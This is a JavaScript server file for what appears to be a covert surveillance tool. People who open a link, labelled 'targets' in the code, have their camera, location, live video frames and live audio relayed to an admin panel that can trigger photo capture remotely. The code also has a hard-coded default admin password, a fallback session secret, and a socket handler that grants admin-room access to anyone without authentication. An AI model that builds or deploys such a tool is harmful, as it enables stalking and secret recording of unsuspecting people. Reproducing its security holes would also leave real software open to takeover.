const express = require("express");
const http = require("http");
const path = require("path");
const fs = require("fs");
const crypto = require("crypto");
const session = require("express-session");
const { Server } = require("socket.io");
require("dotenv").config();

const app = express();
const server = http.createServer(app);

app.set("trust proxy", 1);

const io = new Server(server, {
    maxHttpBufferSize: 10 * 1024 * 1024,
    pingTimeout: 20000,
    pingInterval: 25000
});

const PORT = process.env.PORT || 3000;
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || "ayaz;;";
const SESSION_SECRET = process.env.SESSION_SECRET || "AyazSecretSession2026";

const MAX_USERS = 5;
const MAX_HISTORY = 1000;

const PUBLIC_DIR = path.join(__dirname, "public");
const DATA_DIR = path.join(__dirname, "data");
const UPLOADS_DIR = path.join(PUBLIC_DIR, "uploads");
const HISTORY_FILE = path.join(DATA_DIR, "access-history.json");

if (!fs.existsSync(PUBLIC_DIR)) fs.mkdirSync(PUBLIC_DIR, { recursive: true });
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });

app.use(express.json({ limit: "5mb" }));

const sessionMiddleware = session({
    secret: SESSION_SECRET,
    resave: false,
    saveUninitialized: false,
    cookie: {
        httpOnly: true,
        sameSite: "lax",
        secure: process.env.NODE_ENV === "production",
        maxAge: 1000 * 60 * 60 * 8
    }
});

app.use(sessionMiddleware);
app.use(express.static(PUBLIC_DIR));

let isLinkActive = true;
const connectedTargets = new Map();
const tempPhotos = new Map();
let accessHistory = loadHistory();

function loadHistory() {
    try {
        if (!fs.existsSync(HISTORY_FILE)) {
            fs.writeFileSync(HISTORY_FILE, JSON.stringify([], null, 2));
            return [];
        }
        const raw = fs.readFileSync(HISTORY_FILE, "utf8");
        if (!raw.trim()) return [];
        const parsed = JSON.parse(raw);
        return Array.isArray(parsed) ? parsed : [];
    } catch (error) {
        console.error("Load history error:", error);
        return [];
    }
}

function saveHistory() {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(accessHistory, null, 2));
    } catch (error) {
        console.error("Save history error:", error);
    }
}

function addHistory(record) {
    accessHistory.push({ id: crypto.randomUUID(), ...record });
    if (accessHistory.length > MAX_HISTORY) accessHistory = accessHistory.slice(-MAX_HISTORY);
    saveHistory();
}

function getFilteredHistory() {
    const twelveHoursAgo = Date.now() - (12 * 60 * 60 * 1000);
    return accessHistory.filter(item => new Date(item.connectedAtTime || 0).getTime() >= twelveHoursAgo);
}

function isAdminRequest(req) {
    return req.session && req.session.isAdmin === true;
}

function requireAdmin(req, res, next) {
    if (!isAdminRequest(req)) {
        return res.status(401).json({ ok: false, error: "Admin authentication required." });
    }
    next();
}

function formatAMPM(date) {
    let hours = date.getHours();
    let minutes = date.getMinutes();
    const ampm = hours >= 12 ? 'PM' : 'AM';
    hours = hours % 12;
    hours = hours ? hours : 12;
    minutes = minutes < 10 ? '0' + minutes : minutes;
    return `${hours}:${minutes} ${ampm}`;
}

function getPublicTarget(target) {
    return {
        id: target.id,
        deviceInfo: target.deviceInfo,
        connectedAt: target.connectedAt,
        location: target.location,
        cameraReady: target.cameraReady,
        ip: target.ip
    };
}

function getPublicTargets() {
    const result = {};
    for (const [id, target] of connectedTargets.entries()) {
        result[id] = getPublicTarget(target);
    }
    return result;
}

function emitGlobalState() {
    io.to("admins").emit("update-admin-state", {
        linkActive: isLinkActive,
        users: getPublicTargets(),
        history: getFilteredHistory().slice().reverse(),
        photos: Array.from(tempPhotos.values())
    });
}

app.get("/", (req, res) => res.sendFile(path.join(PUBLIC_DIR, "user.html")));
app.get("/user.html", (req, res) => res.sendFile(path.join(PUBLIC_DIR, "user.html")));

app.get("/admin.html", (req, res) => {
    if (!isAdminRequest(req)) return res.redirect("/");
    res.sendFile(path.join(PUBLIC_DIR, "admin.html"));
});

app.post("/api/admin/login", (req, res) => {
    const { password } = req.body || {};
    if (typeof password !== "string" || password !== ADMIN_PASSWORD) {
        return res.status(401).json({ ok: false, error: "Wrong password." });
    }
    req.session.isAdmin = true;
    req.session.save((err) => {
        if (err) return res.status(500).json({ ok: false, error: "Session save failed" });
        res.json({ ok: true });
    });
});

app.post("/api/admin/logout", requireAdmin, (req, res) => {
    req.session.destroy(() => {
        res.clearCookie("connect.sid");
        res.json({ ok: true });
    });
});

app.get("/api/admin/status", (req, res) => {
    res.json({ ok: true, authenticated: isAdminRequest(req) });
});

app.delete("/api/admin/history", requireAdmin, (req, res) => {
    try {
        accessHistory = [];
        saveHistory();
        emitGlobalState();
        res.json({ ok: true });
    } catch (e) {
        console.error("Clear history error:", e);
        res.status(500).json({ ok: false, error: "Failed to clear history" });
    }
});

app.delete("/api/admin/photos/:id", requireAdmin, (req, res) => {
    try {
        const photo = tempPhotos.get(req.params.id);
        if (photo && fs.existsSync(photo.filePath)) {
            fs.unlinkSync(photo.filePath);
        }
        const existed = tempPhotos.delete(req.params.id);
        io.to("admins").emit("photo-deleted", req.params.id);
        res.json({ ok: true, deleted: existed });
    } catch (e) {
        console.error("Delete photo error:", e);
        res.status(500).json({ ok: false, error: "Failed to delete photo" });
    }
});

io.on("connection", (socket) => {
    const clientIp = socket.handshake.headers["x-forwarded-for"] || socket.handshake.address;

    socket.on("admin-auth", () => {
        socket.join("admins");
        socket.emit("admin-initial-state", {
            linkActive: isLinkActive,
            users: getPublicTargets(),
            history: getFilteredHistory().slice().reverse(),
            photos: Array.from(tempPhotos.values()),
            maxUsers: MAX_USERS
        });
    });

    socket.on("admin-toggle-link", (status) => {
        isLinkActive = Boolean(status);
        if (!isLinkActive) io.to("users").emit("link-disabled");
        io.emit("link-status-changed", isLinkActive);
        emitGlobalState();
    });

    socket.on("admin-trigger-capture", (targetSocketId) => {
        if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
        io.to(targetSocketId).emit("capture-photo");
    });

    socket.on("admin-request-location", (targetSocketId) => {
        if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
        io.to(targetSocketId).emit("request-location");
    });

    socket.on("admin-switch-camera", (targetSocketId) => {
        if (!isLinkActive || !connectedTargets.has(targetSocketId)) return;
        io.to(targetSocketId).emit("switch-camera");
    });

    socket.on("user-connect-info", (data) => {
        if (!isLinkActive) { socket.emit("link-disabled"); return; }
        if (!connectedTargets.has(socket.id)) {
            if (connectedTargets.size >= MAX_USERS) {
                socket.emit("server-full", { maxUsers: MAX_USERS });
                socket.disconnect(true);
                return;
            }
            const now = new Date();
            const target = {
                id: socket.id,
                ip: clientIp,
                deviceInfo: data && typeof data.deviceInfo === "string" ? data.deviceInfo.slice(0, 150) : "Web User",
                connectedAtTime: now.getTime(),
                connectedAt: formatAMPM(now),
                disconnectedAt: "-",
                duration: "Active...",
                location: null,
                cameraReady: false
            };
            connectedTargets.set(socket.id, target);
            socket.join("users");
            emitGlobalState();
        }
    });

    socket.on("user-ready", (data) => {
        if (!isLinkActive) return;
        let target = connectedTargets.get(socket.id);
        if (!target) {
            if (connectedTargets.size >= MAX_USERS) {
                socket.emit("server-full", { maxUsers: MAX_USERS });
                socket.disconnect(true);
                return;
            }
            const now = new Date();
            target = {
                id: socket.id,
                ip: clientIp,
                deviceInfo: data && typeof data.deviceInfo === "string" ? data.deviceInfo.slice(0, 150) : "Web User",
                connectedAtTime: now.getTime(),
                connectedAt: formatAMPM(now),
                disconnectedAt: "-",
                duration: "Active...",
                location: null,
                cameraReady: true
            };
            connectedTargets.set(socket.id, target);
            socket.join("users");
        }
        target.cameraReady = true;
        emitGlobalState();
    });

    socket.on("user-location", (locData) => {
        const target = connectedTargets.get(socket.id);
        if (!target || !locData) return;
        const lat = Number(locData.latitude);
        const lng = Number(locData.longitude);
        if (!Number.isFinite(lat) || !Number.isFinite(lng)) return;

        target.location = { 
            latitude: Number(lat.toFixed(6)), 
            longitude: Number(lng.toFixed(6)) 
        };
        emitGlobalState();
    });

    socket.on("live-stream-frame", (frameData) => {
        if (!isLinkActive || !connectedTargets.has(socket.id)) return;
        io.to("admins").emit("update-live-stream", { socketId: socket.id, frameData });
    });

    socket.on("live-audio-chunk", (audioData) => {
        if (!isLinkActive || !connectedTargets.has(socket.id)) return;
        io.to("admins").emit("update-live-audio", { socketId: socket.id, audioData });
    });

    socket.on("user-photo-captured", (imageData) => {
        if (!isLinkActive || !connectedTargets.has(socket.id) || typeof imageData !== "string") return;
        try {
            const matches = imageData.match(/^data:image\/([a-zA-Z0-9]+);base64,(.+)$/);
            if (!matches || matches.length !== 3) return;
            const ext = matches[1] === "jpeg" ? "jpg" : matches[1];
            const buffer = Buffer.from(matches[2], "base64");
            const photoId = crypto.randomUUID();
            const fileName = `capture-${photoId}.${ext}`;
            const filePath = path.join(UPLOADS_DIR, fileName);
            
            fs.writeFileSync(filePath, buffer);

            const photo = {
                id: photoId,
                imageUrl: `/uploads/${fileName}`,
                socketId: socket.id,
                deviceInfo: connectedTargets.get(socket.id)?.deviceInfo || "Web User",
                capturedAt: formatAMPM(new Date())
            };
            tempPhotos.set(photoId, photo);
            io.to("admins").emit("new-photo", photo);
        } catch (e) {
            console.error("Error processing captured photo:", e);
        }
    });

    socket.on("disconnect", () => {
        const target = connectedTargets.get(socket.id);
        if (target) {
            const disconnectTime = new Date();
            const durationMs = disconnectTime.getTime() - target.connectedAtTime;
            const secs = Math.floor(durationMs / 1000);
            const mins = Math.floor(secs / 60);
            target.disconnectedAt = formatAMPM(disconnectTime);
            target.duration = mins > 0 ? `${mins}m ${secs % 60}s` : `${secs}s`;

            addHistory({
                deviceInfo: target.deviceInfo,
                ip: target.ip,
                connectedAt: target.connectedAt,
                disconnectedAt: target.disconnectedAt,
                duration: target.duration,
                connectedAtTime: target.connectedAtTime
            });

            connectedTargets.delete(socket.id);
            emitGlobalState();
        }
    });
});

server.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on port ${PORT}`);
});